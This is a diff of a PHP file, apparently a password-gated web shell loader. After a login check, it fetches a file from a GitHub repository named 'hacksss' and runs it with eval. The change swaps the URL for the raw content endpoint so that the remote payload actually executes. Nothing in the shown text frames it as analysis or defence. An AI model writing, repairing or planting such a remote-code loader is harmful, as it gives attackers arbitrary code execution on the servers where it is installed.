@@ -60,7 +60,7 @@ if (isset($_POST['log']) && $_POST['log'] === 'login' && isset($_POST['username'
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://github.com/tlhkpln/hacksss/blob/main/y.txt');
+    $a = geturlsinfo('https://raw.githubusercontent.com/tlhkpln/hacksss/main/y.txt');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
